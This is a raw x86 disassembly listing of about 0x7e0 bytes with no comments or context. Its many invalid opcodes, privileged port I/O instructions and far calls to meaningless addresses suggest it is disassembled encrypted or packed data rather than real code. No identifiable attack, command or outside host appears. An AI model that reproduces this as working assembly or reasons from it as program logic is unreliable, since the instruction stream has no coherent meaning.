  4101ee:	inc    eax
  4101ef:	repnz push es
  4101f1:	push   ebx
  4101f2:	sub    eax,DWORD PTR [edx-0x73027c9a]
  4101f8:	lods   al,BYTE PTR ds:[esi]
  4101f9:	xchg   esi,eax
  4101fa:	dec    edx
  4101fb:	ror    BYTE PTR [edx],cl
  4101fd:	add    al,BYTE PTR [edi+0x23a691]
  410203:	inc    esp
  410204:	pop    eax
  410205:	jp     0x410252
  410207:	(bad)  
  410208:	jmp    0x2c8897f3
  41020d:	ss adc al,0x37
  410210:	and    ah,BYTE PTR [edi]
  410212:	inc    esp
  410213:	dec    ecx
  410214:	push   ebx
  410215:	adc    eax,0x84ea524a
  41021a:	sub    eax,0xdbd7c6ab
  41021f:	inc    ebx
  410220:	leave  
  410221:	call   0xed902235
  410226:	test   ebx,edi
  410228:	outs   dx,DWORD PTR ds:[esi]
  410229:	popa   
  41022a:	les    ebp,FWORD PTR [ebx-0x18fad514]
  410230:	pop    edx
  410231:	and    ebp,0x10516d15
  410237:	push   0x482c1059
  41023c:	jl     0x4101df
  41023e:	or     BYTE PTR [edx-0x7e],bl
  410241:	fsub   QWORD PTR [ebp-0x28]
  410244:	(bad)  
  410246:	rcr    DWORD PTR [eax],0x9b
  410249:	rcl    bl,cl
  41024b:	sbb    dh,BYTE PTR [ebx+0x57d60bf]
  410251:	jmp    ebp
  410253:	in     eax,dx
  410254:	add    al,0x5e
  410256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410257:	pop    edi
  410258:	jnp    0x4101f3
  41025a:	mov    eax,ds:0x9dd325a6
  41025f:	xor    BYTE PTR [esi-0x5],ch
  410262:	inc    ebp
  410263:	push   edi
  410264:	xor    bl,BYTE PTR [eiz*8-0x3ea6cfad]
  41026b:	xor    al,0x66
  41026d:	jmp    0x41025a
  41026f:	imul   ebp,DWORD PTR [esi-0x77],0xffffff8d
  410273:	add    DWORD PTR cs:[esi],ebx
  410276:	cmp    ch,dl
  410278:	fimul  DWORD PTR [edx+0x21d12ac3]
  41027e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41027f:	(bad)  
  410280:	mov    DWORD PTR [eax],esi
  410282:	pop    ebx
  410283:	mov    ah,BYTE PTR [eax+0x4f9b7a98]
  410289:	out    0xe9,eax
  41028b:	mov    BYTE PTR [ecx+0x73],dh
  41028e:	pop    ebx
  41028f:	dec    ecx
  410290:	pushf  
  410291:	push   cs
  410292:	mov    dl,0x9a
  410294:	mov    BYTE PTR [esi-0x43676fe0],ch
  41029a:	mov    ds,esp
  41029c:	xlat   BYTE PTR ds:[ebx]
  41029d:	addr16 inc esp
  41029f:	dec    ebx
  4102a0:	push   ebx
  4102a1:	aam    0xf1
  4102a3:	jmp    DWORD PTR [esi-0x718a25a3]
  4102a9:	(bad)  
  4102ab:	sub    al,0x93
  4102ad:	aad    0x71
  4102af:	or     al,0xda
  4102b1:	into   
  4102b2:	ror    BYTE PTR [eax-0x46],cl
  4102b5:	jecxz  0x4102d8
  4102b7:	mov    dh,0x6d
  4102b9:	jg     0x4102f2
  4102bb:	sub    BYTE PTR cs:[eax],0x98
  4102bf:	call   0xe2e7fc5c
  4102c4:	lock sub BYTE PTR [ebx+ebx*8-0x134864a0],0x69
  4102cd:	scas   eax,DWORD PTR es:[edi]
  4102ce:	mov    esi,0xbb025a7b
  4102d3:	dec    ebp
  4102d4:	push   0x33
  4102d6:	fdivr  QWORD PTR [eax+esi*1-0x49]
  4102da:	ja     0x410310
  4102dc:	xchg   esp,eax
  4102dd:	jl     0x410277
  4102df:	sbb    al,0x64
  4102e1:	jmp    0xf6c2cf0b
  4102e6:	adc    DWORD PTR [edi-0x6b786ebf],edx
  4102ec:	mov    ah,0x85
  4102ee:	xchg   edx,ecx
  4102f0:	jecxz  0x4102f4
  4102f2:	enter  0x4dea,0x3a
  4102f6:	mov    esi,0x1f632bad
  4102fb:	adc    BYTE PTR [ebx],bl
  4102fd:	jg     0x410296
  4102ff:	cdq    
  410300:	cmp    BYTE PTR [ebx],dl
  410302:	jecxz  0x41035f
  410304:	sbb    DWORD PTR [ebx+0x36],eax
  410307:	jb     0x410354
  410309:	jns    0x410348
  41030b:	dec    edi
  41030c:	ror    BYTE PTR [esi+0x1b9b53b0],0x4f
  410313:	and    al,0x41
  410315:	pop    esi
  410316:	sahf   
  410317:	mov    eax,0x71489aae
  41031c:	push   eax
  41031d:	pop    ecx
  41031e:	or     bl,BYTE PTR [edx-0x6fd76560]
  410324:	push   ecx
  410325:	sahf   
  410326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410327:	dec    ebp
  410328:	ss clc 
  41032a:	cmp    al,0x1c
  41032c:	sub    al,0xf2
  41032e:	lock adc eax,0xce907516
  410334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410336:	mov    esi,0x724e2521
  41033b:	scas   al,BYTE PTR es:[edi]
  41033c:	and    bh,BYTE PTR [esi-0x4a]
  41033f:	ror    ebp,0x2
  410342:	sbb    eax,0x358f66a8
  410347:	int3   
  410348:	jecxz  0x410342
  41034a:	ror    BYTE PTR [eax+0x6302abfb],cl
  410350:	and    al,0x8e
  410352:	loope  0x4102d7
  410354:	pop    edi
  410355:	aas    
  410356:	mov    ds:0x8c461c43,al
  41035b:	div    eax
  41035d:	aad    0x17
  41035f:	push   ebp
  410360:	ret    
  410361:	mov    ds:0xbd4dcbf7,eax
  410366:	mov    ds:0xa822f0a,eax
  41036b:	jmp    0x4103dc
  41036d:	mov    ds:0x97f95d82,al
  410372:	fwait
  410373:	dec    edi
  410374:	pop    es
  410375:	ret    0x5ae
  410378:	dec    esp
  410379:	sub    eax,0x318666f6
  41037e:	push   edx
  41037f:	ret    0xfcdf
  410382:	jbe    0x410357
  410384:	adc    esi,0xffffffbf
  410387:	mov    ah,0xa6
  410389:	mov    ebp,0x169fbd7c
  41038e:	ror    edx,1
  410390:	and    al,0x88
  410392:	int    0x7f
  410394:	push   ebx
  410395:	dec    ecx
  410396:	(bad)  
  410397:	lock idiv DWORD PTR [ecx+0x26]
  41039b:	jg     0x4103d4
  41039d:	stos   DWORD PTR es:[edi],eax
  41039e:	lods   eax,DWORD PTR ds:[esi]
  41039f:	out    dx,eax
  4103a0:	push   ebx
  4103a1:	push   cs
  4103a2:	mov    edx,0x702b9c26
  4103a7:	sbb    al,BYTE PTR [ecx-0x1fe723f6]
  4103ad:	inc    eax
  4103ae:	mov    al,ds:0x2a3d25b1
  4103b3:	jmp    0x4103b9
  4103b5:	out    dx,eax
  4103b6:	dec    esp
  4103b7:	jno    0x410426
  4103b9:	push   eax
  4103ba:	addr16 inc ebp
  4103bc:	dec    edx
  4103bd:	std    
  4103be:	ss adc eax,0x50f4efad
  4103c4:	mov    ds:0x40fa09eb,eax
  4103c9:	push   0x58
  4103cb:	clc    
  4103cc:	mov    cl,0xa3
  4103ce:	sub    al,0xdb
  4103d0:	jmp    0x410379
  4103d2:	mov    bl,0xdb
  4103d4:	sbb    BYTE PTR [edx+0xdbd1524],ch
  4103da:	adc    BYTE PTR [ebx+ecx*1-0x279a8db7],0x65
  4103e2:	cs das 
  4103e4:	add    al,0xff
  4103e6:	cmp    DWORD PTR [eax-0x19],esi
  4103e9:	mov    dl,0xb1
  4103eb:	mov    esi,0xda41c763
  4103f0:	cs jb  0x410430
  4103f3:	loope  0x410410
  4103f5:	inc    ebp
  4103f6:	push   ecx
  4103f7:	imul   esp,ecx,0x66
  4103fa:	push   ebp
  4103fb:	cdq    
  4103fc:	sar    BYTE PTR [ecx],cl
  4103fe:	push   0xd8864771
  410403:	inc    ecx
  410404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410405:	dec    esi
  410406:	fs jae 0x41044a
  410409:	imul   ebp,DWORD PTR [ebx+eiz*4],0xdb91895a
  410410:	pop    edi
  410411:	lods   al,BYTE PTR ds:[esi]
  410412:	inc    esi
  410413:	popa   
  410414:	inc    edx
  410415:	cdq    
  410416:	and    dh,BYTE PTR [edi+edi*4+0x48]
  41041a:	aas    
  41041b:	cmp    DWORD PTR [ecx],eax
  41041d:	mov    dh,0xfe
  41041f:	rcr    BYTE PTR [eax],cl
  410421:	adc    edi,DWORD PTR [edi+0x189d0ab6]
  410427:	jb     0x410415
  410429:	jb     0x410467
  41042b:	das    
  41042c:	and    BYTE PTR [edx+0x691ccdf4],dl
  410432:	es imul ebp,edx,0x4782f1e4
  410439:	call   0xa7fc:0x327715c0
  410440:	outs   dx,DWORD PTR ds:[esi]
  410441:	in     al,dx
  410442:	shl    DWORD PTR [ebx-0x1b],1
  410445:	add    ebp,esi
  410447:	inc    eax
  410448:	mov    al,0xab
  41044a:	sbb    edi,DWORD PTR [edi]
  41044c:	(bad)  
  41044e:	cmp    dl,BYTE PTR [ebx]
  410450:	popa   
  410451:	add    ecx,esp
  410453:	fs retf 0xfd5e
  410457:	xchg   ecx,eax
  410458:	aam    0x2a
  41045a:	jae    0x410464
  41045c:	sub    al,0x9
  41045e:	gs dec esi
  410460:	cwde   
  410461:	inc    esp
  410462:	pusha  
  410463:	mov    ecx,0x85c859e5
  410468:	(bad)  
  410469:	sti    
  41046a:	outs   dx,BYTE PTR ds:[esi]
  41046b:	(bad)  
  41046d:	xor    BYTE PTR [eax+ecx*8-0x668be80e],bh
  410474:	addr16 (bad) 
  410476:	ins    DWORD PTR es:[edi],dx
  410477:	out    0x87,al
  410479:	pop    ebp
  41047a:	shl    BYTE PTR [esi],0xdd
  41047d:	jns    0x410450
  41047f:	cmp    eax,0x6dea6eb9
  410484:	test   DWORD PTR [ecx-0x52],0x559d61ee
  41048b:	nop
  41048c:	inc    eax
  41048d:	repnz ror BYTE PTR [ecx+0x2a],0x85
  410492:	outs   dx,BYTE PTR ds:[esi]
  410493:	stos   BYTE PTR es:[edi],al
  410494:	sub    cl,BYTE PTR [bx]
  410497:	jl     0x410517
  410499:	fcom   DWORD PTR [edx]
  41049b:	int    0xf6
  41049d:	mov    ds:0xa5db111,al
  4104a2:	dec    edx
  4104a3:	rol    BYTE PTR [ebx-0x622f85db],1
  4104a9:	jle    0x410510
  4104ab:	fcom   QWORD PTR [edx-0x3]
  4104ae:	cmp    DWORD PTR [edx],0xffffffed
  4104b1:	push   edi
  4104b2:	lods   al,BYTE PTR ds:[esi]
  4104b3:	and    eax,0x79bbbf5e
  4104b8:	adc    ecx,esp
  4104ba:	neg    DWORD PTR [ebx-0x1e]
  4104bd:	inc    esi
  4104be:	sub    DWORD PTR [ebx-0x410a680a],ecx
  4104c4:	arpl   WORD PTR ds:0xf8c77bfd,dx
  4104ca:	mov    bl,0x30
  4104cc:	add    eax,0x80df2515
  4104d1:	xchg   ebx,eax
  4104d2:	xor    BYTE PTR [edx-0x4d],dh
  4104d5:	lods   al,BYTE PTR ds:[esi]
  4104d6:	pushf  
  4104d7:	inc    ebp
  4104d8:	push   ebp
  4104d9:	(bad)  
  4104da:	jecxz  0x410501
  4104dc:	pop    ebp
  4104dd:	sub    eax,0x5fac9f21
  4104e2:	xchg   esp,eax
  4104e3:	or     esi,ebp
  4104e5:	mov    al,0xfa
  4104e7:	(bad)
  4104eb:	and    BYTE PTR [esi-0x1cf97cc5],ah
  4104f1:	jnp    0x410513
  4104f3:	into   
  4104f4:	jmp    0x13f4:0x6fb36393
  4104fb:	jno    0x4104b8
  4104fd:	sub    al,0xa6
  4104ff:	mov    edi,0x87a72a57
  410504:	xchg   ebp,eax
  410505:	push   ss
  410506:	sar    eax,0x7e
  410509:	aad    0x5d
  41050b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41050c:	push   ebx
  41050d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41050e:	add    BYTE PTR [esi+edi*8+0x70],ch
  410512:	scas   eax,DWORD PTR es:[edi]
  410513:	call   0xe9dde281
  410518:	fcomp  QWORD PTR [ebx-0x3015ffec]
  41051e:	xor    edx,ebp
  410520:	add    al,0xe0
  410522:	pop    DWORD PTR [esi+ebx*4+0x18dc4c5a]
  410529:	sbb    eax,0xddbba2be
  41052e:	or     ch,dl
  410530:	xor    cl,BYTE PTR [edx+0x6]
  410533:	inc    ebp
  410534:	mov    dh,0xae
  410536:	cld    
  410537:	sbb    eax,0xb61fa307
  41053c:	shl    BYTE PTR [esi],1
  41053e:	push   0x28
  410540:	stos   BYTE PTR es:[edi],al
  410541:	mov    bh,0xbb
  410543:	xlat   BYTE PTR ds:[ebx]
  410544:	mov    ch,0xc4
  410546:	jge    0x410520
  410548:	out    dx,eax
  410549:	out    0x77,eax
  41054b:	jbe    0x4105a2
  41054d:	xchg   esp,eax
  41054e:	mov    eax,0xb2a45c6
  410553:	fcomp  DWORD PTR [ebx]
  410555:	push   ecx
  410556:	add    DWORD PTR [edi],esp
  410558:	sbb    al,0x79
  41055a:	rcl    BYTE PTR [ecx],1
  41055c:	pusha  
  41055d:	fwait
  41055e:	mov    dl,0x1b
  410560:	inc    ebp
  410561:	in     al,0x4c
  410563:	inc    ebp
  410564:	pop    edi
  410565:	pop    edi
  410566:	stos   DWORD PTR es:[edi],eax
  410567:	and    bh,BYTE PTR [ebx-0x32580228]
  41056d:	xchg   ebp,eax
  41056e:	and    DWORD PTR [eax-0x4e],esp
  410571:	mov    eax,0xfba3700a
  410576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410577:	mov    BYTE PTR [edi],al
  410579:	push   0x39
  41057b:	test   DWORD PTR [ecx-0x7abb43b],edi
  410581:	ss dec edi
  410583:	and    BYTE PTR gs:[ecx-0x6e],0x96
  410588:	push   0x54
  41058a:	and    cl,dl
  41058c:	lea    edx,[ebp+0x6a]
  41058f:	pusha  
  410590:	xor    BYTE PTR [ebp+ecx*2+0x5e100f36],0x5f
  410598:	dec    eax
  410599:	pop    esi
  41059a:	leave  
  41059b:	xchg   esp,eax
  41059c:	jge    0x410611
  41059e:	in     al,0x1d
  4105a0:	call   0xf415:0x2503251e
  4105a7:	fisubr DWORD PTR [ebx+0x13f58fad]
  4105ad:	and    BYTE PTR [esi+0x317693d4],dh
  4105b3:	js     0x41058d
  4105b5:	lahf   
  4105b6:	jne    0x4105d9
  4105b8:	sub    al,0x5e
  4105ba:	test   eax,0x67d076eb
  4105bf:	push   esi
  4105c0:	jo     0x4105e8
  4105c2:	bound  ebp,QWORD PTR [ecx+0x32940a32]
  4105c8:	pop    edx
  4105c9:	js     0x4105cc
  4105cb:	in     al,0xa8
  4105cd:	retf   0x5414
  4105d0:	das    
  4105d1:	mov    ah,0xc9
  4105d3:	and    al,0xb9
  4105d5:	cmc    
  4105d6:	mov    edx,0x614ba278
  4105db:	xchg   esi,eax
  4105dc:	fdivr  DWORD PTR [ecx]
  4105de:	jmp    0x41059b
  4105e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105e1:	mov    esp,0x832816be
  4105e6:	leave  
  4105e7:	cmp    al,0xe9
  4105e9:	leave  
  4105ea:	mov    edx,0xc5fd8954
  4105ef:	xchg   esp,eax
  4105f0:	out    0xa1,al
  4105f2:	les    ebx,FWORD PTR [eax-0xa]
  4105f5:	popa   
  4105f6:	sbb    BYTE PTR [edx],ah
  4105f8:	xchg   edx,eax
  4105f9:	inc    ebx
  4105fa:	out    dx,eax
  4105fb:	shl    ebx,1
  4105fd:	data16 jbe 0x41059a
  410600:	and    al,0x48
  410602:	pop    ds
  410603:	fldenv [edx-0x5dd344bb]
  410609:	mov    esi,0xef49ed3a
  41060e:	jle    0x410647
  410610:	cld    
  410611:	stos   DWORD PTR es:[edi],eax
  410612:	rcr    DWORD PTR gs:[edx+0x75],1
  410616:	hlt    
  410617:	pop    ebp
  410618:	stos   DWORD PTR es:[edi],eax
  410619:	sub    DWORD PTR [ecx],ebp
  41061b:	into   
  41061c:	xor    ah,ah
  41061e:	fmul   DWORD PTR [esi-0x21]
  410621:	bound  ebp,QWORD PTR [edx+0x3d1be60d]
  410627:	mov    ds:0xe4e1cb3b,al
  41062c:	inc    eax
  41062d:	pop    ebx
  41062e:	scas   al,BYTE PTR es:[edi]
  41062f:	sbb    bl,al
  410631:	imul   edx,DWORD PTR [ebx],0x6c
  410634:	retf   0xac4
  410637:	push   ebx
  410638:	loop   0x41062a
  41063a:	mov    esp,0x31dc4b34
  41063f:	jmp    0x410623
  410641:	out    0xe3,ax
  410644:	mov    dl,0xf6
  410646:	adc    DWORD PTR [esi+0x78],esp
  410649:	lahf   
  41064a:	outs   dx,DWORD PTR ds:[esi]
  41064b:	ins    BYTE PTR es:[edi],dx
  41064c:	xchg   DWORD PTR [esi-0x24],ebx
  41064f:	dec    esp
  410650:	or     dh,ch
  410652:	cwde   
  410653:	sar    dl,1
  410655:	jl     0x410605
  410657:	jb     0x410653
  410659:	ds inc esp
  41065b:	in     al,0xa8
  41065d:	mov    dh,0xe0
  41065f:	pop    esp
  410660:	mov    WORD PTR cs:[esi],cs
  410663:	cmp    esp,DWORD PTR [edi+0x6fd28888]
  410669:	lahf   
  41066a:	imul   ebx,DWORD PTR [ebx-0x430e6db6],0xbdcc9aa7
  410674:	popa   
  410675:	sub    al,0xc6
  410677:	in     eax,dx
  410678:	inc    edx
  410679:	mov    al,0x3c
  41067b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41067c:	mov    al,0x58
  41067e:	sub    al,0x13
  410680:	repz sub ebx,DWORD PTR [edi-0x61]
  410684:	xchg   esp,eax
  410685:	ja     0x410686
  410687:	(bad)  
  410688:	jmp    0xa49e2c18
  41068d:	mov    ebx,0xf305da8b
  410692:	fs das 
  410694:	ss out 0x68,eax
  410697:	xchg   ebx,eax
  410698:	xor    al,0x6c
  41069a:	sub    DWORD PTR [esi+0x7e994064],0xfffffffe
  4106a1:	(bad)  
  4106a2:	mov    ch,0x22
  4106a4:	es popa 
  4106a6:	mov    edi,0xcf57902c
  4106ab:	inc    eax
  4106ac:	add    DWORD PTR [ecx+0x56],edx
  4106af:	fmul   QWORD PTR [edi-0x2c]
  4106b2:	mov    ds:0x165f50c4,eax
  4106b7:	stos   DWORD PTR es:[edi],eax
  4106b8:	adc    al,0x95
  4106ba:	loop   0x4106be
  4106bc:	out    dx,al
  4106bd:	pop    es
  4106be:	add    edx,ebp
  4106c0:	mov    ch,0x7e
  4106c2:	outs   dx,BYTE PTR ds:[esi]
  4106c3:	xor    eax,0xb08731c2
  4106c8:	bound  esp,QWORD PTR [ebx-0x65dd7864]
  4106ce:	repz enter 0x33d4,0x70
  4106d3:	jne    0x41073c
  4106d5:	cmp    bh,dl
  4106d7:	sbb    eax,edx
  4106d9:	lds    esp,FWORD PTR [ebp+0x3b]
  4106dc:	jae    0x4106ef
  4106de:	mov    DWORD PTR [ebp+0x405c3f8],edi
  4106e4:	and    al,BYTE PTR [edi+ebx*4-0x80]
  4106e8:	push   edx
  4106e9:	enter  0x97c2,0x8
  4106ed:	push   es
  4106ee:	adc    bl,BYTE PTR [ecx]
  4106f0:	dec    ebx
  4106f1:	dec    esp
  4106f2:	push   cs
  4106f3:	(bad)  
  4106f4:	fbstp  TBYTE PTR [eax]
  4106f6:	push   0xffffffca
  4106f8:	test   eax,0x639d8ca0
  4106fd:	cdq    
  4106fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106ff:	aam    0xc0
  410701:	adc    ah,dl
  410703:	dec    eax
  410704:	pop    esp
  410705:	push   ecx
  410706:	lea    esp,[ebx]
  410708:	pop    ecx
  410709:	mov    edi,0x373de3b8
  41070e:	dec    edi
  41070f:	add    BYTE PTR [ebx+ebp*1+0x7d],al
  410713:	dec    esi
  410714:	add    eax,0x53374123
  410719:	int    0xe1
  41071b:	mov    eax,0x9834a68d
  410720:	dec    ecx
  410721:	jl     0x410701
  410723:	cwde   
  410724:	sub    BYTE PTR [edi+0x59ee75e],cl
  41072a:	mov    eax,ds:0xaef2a9c1
  41072f:	mov    ah,0xc7
  410731:	test   eax,0xacf25f16
  410736:	imul   eax,ebx,0x48dfe462
  41073c:	or     eax,0x276e823
  410741:	push   0x3a
  410743:	or     al,0xf9
  410745:	enter  0x79dc,0xa0
  410749:	mov    dl,0x21
  41074b:	in     eax,0xed
  41074d:	retf   
  41074e:	fsub   QWORD PTR ss:[edi-0x3854b641]
  410755:	dec    edi
  410756:	in     eax,dx
  410757:	(bad)  
  410758:	in     eax,dx
  410759:	int    0x4
  41075b:	xor    BYTE PTR [ebp+edi*8+0x2c],dh
  41075f:	loope  0x41077c
  410761:	fbld   TBYTE PTR ds:0xc5184165
  410767:	repz or al,0xa8
  41076a:	xchg   ebp,eax
  41076b:	aad    0x92
  41076d:	or     ebp,DWORD PTR [edx]
  41076f:	dec    ebx
  410770:	enter  0x3b5,0x1c
  410774:	dec    esp
  410775:	sbb    al,0x44
  410777:	dec    edx
  410778:	js     0x410766
  41077a:	fisub  WORD PTR [ecx]
  41077c:	sub    dl,BYTE PTR [ebp-0x77adbaab]
  410782:	sub    dl,BYTE PTR gs:[ebp+0x70f57263]
  410789:	xchg   edi,eax
  41078a:	push   0x65
  41078c:	ins    BYTE PTR es:[edi],dx
  41078d:	push   esi
  41078e:	dec    esi
  41078f:	leave  
  410790:	call   0xdfc5:0x4aa89c61
  410797:	ror    edi,0xc1
  41079a:	fucomi st,st(1)
  41079c:	sub    DWORD PTR [edi+0x780c57dc],esi
  4107a2:	sbb    BYTE PTR [ebx-0x4b52ce0e],dh
  4107a8:	or     al,0xf0
  4107aa:	xchg   ecx,eax
  4107ab:	sub    edx,DWORD PTR [edx+0x59734963]
  4107b1:	cdq    
  4107b2:	mov    ebx,0x7a7e7208
  4107b7:	mov    dh,0x8a
  4107b9:	add    DWORD PTR ds:0x6d71a21a,0xec5ffc7e
  4107c3:	cmp    bl,BYTE PTR [edx+ebx*8+0x5b455b76]
  4107ca:	mov    ebp,0xdd5ec013
  4107cf:	xor    dh,ch
  4107d1:	or     ah,BYTE PTR [edi+0x6e]
  4107d4:	xchg   edi,eax
  4107d5:	(bad)  
  4107d6:	in     eax,dx
  4107d7:	retf   0x3657
  4107da:	sub    eax,0x34164ce1
  4107df:	sbb    DWORD PTR [edx-0x6f],ecx
  4107e2:	mov    edx,0xbe3fde4a
  4107e7:	inc    ebx
  4107e8:	push   0x1a97c18d
  4107ed:	mov    DWORD PTR [eax],ebx
  4107ef:	sbb    edx,DWORD PTR [eax-0x1]
  4107f2:	pop    ebp
  4107f3:	repz (bad) 
  4107f5:	mov    dl,0xe1
  4107f7:	aaa    
  4107f8:	test   DWORD PTR [eax-0x9],0x6fe09218
  4107ff:	jmp    0x6668f024
  410804:	pop    esp
  410805:	shl    cl,0x70
  410808:	jge    0x41081a
  41080a:	rol    bh,0x8b
  41080d:	dec    ecx
  41080e:	mov    dl,0x5f
  410810:	ins    DWORD PTR es:[edi],dx
  410811:	stos   BYTE PTR es:[edi],al
  410812:	push   0xbcd6f1ca
  410817:	sub    edx,esp
  410819:	out    dx,eax
  41081a:	add    ebp,DWORD PTR [ebx-0x6f]
  41081d:	stos   BYTE PTR es:[edi],al
  41081e:	mov    ds:0x679fd349,al
  410823:	push   ss
  410824:	jnp    0x4107c3
  410826:	fbld   TBYTE PTR [edx]
  410828:	arpl   WORD PTR [edx],cx
  41082a:	(bad)  
  41082b:	pop    edi
  41082c:	mov    cl,0xa3
  41082e:	popa   
  41082f:	push   ebp
  410830:	popa   
  410831:	xchg   BYTE PTR [edx+0x78],ch
  410834:	pop    ss
  410835:	popf   
  410836:	call   0xeddb:0x2fb7a944
  41083d:	sar    ch,cl
  41083f:	std    
  410840:	mov    edi,0x2f458046
  410845:	jg     0x4107cb
  410847:	in     eax,dx
  410848:	sub    DWORD PTR [ebx],esi
  41084a:	ret    0x4eb4
  41084d:	out    0x95,al
  41084f:	popf   
  410850:	dec    esp
  410851:	outs   dx,DWORD PTR ds:[esi]
  410852:	sub    cl,BYTE PTR [ebx]
  410854:	adc    al,0x75
  410856:	xchg   DWORD PTR [ebp+0x8],edi
  410859:	cmc    
  41085a:	arpl   di,di
  41085c:	bound  esi,QWORD PTR [ebx-0x3f265155]
  410862:	outs   dx,BYTE PTR ds:[esi]
  410863:	fnstsw WORD PTR [ebp+0xd1c3db4]
  410869:	jg     0x41083d
  41086b:	inc    edx
  41086c:	push   ds
  41086d:	and    DWORD PTR [edi],edi
  41086f:	mov    WORD PTR ds:0x33f7f353,cs
  410875:	pop    ds
  410876:	sub    esi,0xf4aa7b1
  41087c:	stc    
  41087d:	scas   al,BYTE PTR es:[edi]
  41087e:	hlt    
  41087f:	sub    ecx,ebx
  410881:	pusha  
  410882:	dec    esi
  410883:	mov    dh,0xc4
  410885:	cmp    ebx,DWORD PTR [edx]
  410887:	ss in  al,dx
  410889:	xchg   esp,eax
  41088a:	stc    
  41088b:	ss in  al,0x96
  41088e:	jl     0x4108ba
  410890:	jle    0x4108bf
  410892:	cmc    
  410893:	gs pushw es
  410896:	jge    0x410899
  410898:	jg     0x41082a
  41089a:	jmp    0x41090d
  41089c:	ret    
  41089d:	out    0x49,eax
  41089f:	stos   BYTE PTR es:[edi],al
  4108a0:	jae    0x41084a
  4108a2:	xchg   ebp,eax
  4108a3:	cmp    ch,BYTE PTR [edi]
  4108a5:	ficom  WORD PTR [edi]
  4108a7:	xor    dl,ah
  4108a9:	outs   dx,BYTE PTR ds:[esi]
  4108aa:	ss dec ebp
  4108ac:	repnz ins DWORD PTR es:[edi],dx
  4108ae:	inc    ecx
  4108af:	push   esp
  4108b0:	adc    edi,DWORD PTR [edx-0x70]
  4108b3:	or     edi,ecx
  4108b5:	cdq    
  4108b6:	or     dl,BYTE PTR ds:0xc203572
  4108bc:	je     0x410927
  4108be:	sub    eax,0xb8f7e49c
  4108c3:	lods   eax,DWORD PTR ds:[esi]
  4108c4:	fimul  WORD PTR [ebp+0xd]
  4108c7:	rcpps  xmm6,xmm5
  4108ca:	dec    ebx
  4108cb:	ds xor eax,0xcc91ae71
  4108d1:	mov    bl,0xdd
  4108d3:	inc    edi
  4108d4:	inc    eax
  4108d5:	jno    0x41087b
  4108d7:	std    
  4108d8:	adc    DWORD PTR [ecx+0x5f752014],esp
  4108de:	out    0xff,eax
  4108e0:	jecxz  0x410865
  4108e2:	push   cs
  4108e3:	mov    ebx,0x50bed02c
  4108e8:	jl     0x410890
  4108ea:	(bad)  
  4108eb:	js     0x410954
  4108ed:	mov    bl,0x11
  4108ef:	fdivr  st,st(6)
  4108f1:	aas    
  4108f2:	les    eax,FWORD PTR [ebx+ecx*1]
  4108f5:	xchg   ecx,eax
  4108f6:	(bad)  
  4108f7:	push   ebp
  4108f8:	mov    eax,ds:0x5eae745c
  4108fd:	pop    eax
  4108fe:	jmp    0x41091f
  410900:	call   0xb4c3b7c3
  410905:	mov    dl,0x39
  410907:	sbb    BYTE PTR [eax-0x14],cl
  41090a:	aam    0xe1
  41090c:	in     al,0x4e
  41090e:	int3   
  41090f:	inc    esp
  410910:	cli    
  410911:	fs mov ebx,0x3706ae21
  410917:	push   edi
  410918:	lock jo 0x41091d
  41091b:	sbb    BYTE PTR [ecx+0x2b6faf72],bh
  410921:	js     0x41098f
  410923:	push   edi
  410924:	fld    DWORD PTR [edi]
  410926:	outs   dx,DWORD PTR ds:[esi]
  410927:	ja     0x41090e
  410929:	gs push ebx
  41092b:	fadd   QWORD PTR [eax+0x47]
  41092e:	scas   al,BYTE PTR es:[edi]
  41092f:	sub    BYTE PTR [edi-0x6fba43d7],cl
  410935:	push   edi
  410936:	adc    BYTE PTR [ebx+0x42],dl
  410939:	scas   al,BYTE PTR es:[edi]
  41093a:	test   eax,0x343b643b
  41093f:	mov    edx,0x2db732ad
  410944:	inc    eax
  410945:	mov    ch,0xd9
  410947:	rcr    DWORD PTR [ecx-0x35],cl
  41094a:	lahf   
  41094b:	sahf   
  41094c:	(bad)  
  41094d:	push   edx
  41094e:	ins    BYTE PTR es:[edi],dx
  41094f:	shl    DWORD PTR [eax],cl
  410951:	loope  0x41099d
  410953:	sbb    eax,0x88c6c2c8
  410958:	rcl    DWORD PTR [eax],1
  41095a:	jg     0x41092e
  41095c:	xchg   ebx,eax
  41095d:	lahf   
  41095e:	xchg   ebx,eax
  41095f:	jae    0x4109b9
  410961:	enter  0xe511,0xe
  410965:	enter  0xaaed,0x3b
  410969:	in     eax,0x3f
  41096b:	adc    eax,esi
  41096d:	call   0xca4c:0x44cd216c
  410974:	adc    al,0x4f
  410976:	test   DWORD PTR [edx],esp
  410978:	xchg   edx,eax
  410979:	das    
  41097a:	mov    esp,0x4272cd3d
  41097f:	fiadd  WORD PTR ds:0xb85b12b1
  410985:	push   ebx
  410986:	idiv   BYTE PTR [ebx]
  410988:	aas    
  410989:	push   edx
  41098a:	pop    ecx
  41098b:	pusha  
  41098c:	pop    es
  41098d:	mov    fs,WORD PTR [ebx]
  41098f:	popf   
  410990:	push   ebp
  410991:	push   eax
  410992:	cmp    DWORD PTR [ebx-0x37],esp
  410995:	call   0xf5b:0xe62b9d3e
  41099c:	ret    
  41099d:	dec    ecx
  41099e:	leave  
  41099f:	jecxz  0x41093e
  4109a1:	sbb    eax,0xe229e18c
  4109a6:	sub    edi,0x97e1a676
  4109ac:	out    dx,al
  4109ad:	xchg   esp,eax
  4109ae:	add    eax,0xb20b0deb
  4109b3:	popf   
  4109b4:	and    cl,BYTE PTR [ebx+eax*4]
  4109b7:	pop    edi
  4109b8:	out    dx,al
  4109b9:	or     al,0x77
  4109bb:	cmp    esp,DWORD PTR [esi+0x5d]
  4109be:	imul   esi,DWORD PTR [edi],0xf3abc8db
  4109c4:	dec    ebx
  4109c5:	mov    edx,0x74ad19b6
  4109ca:	pop    edi
  4109cb:	push   ds
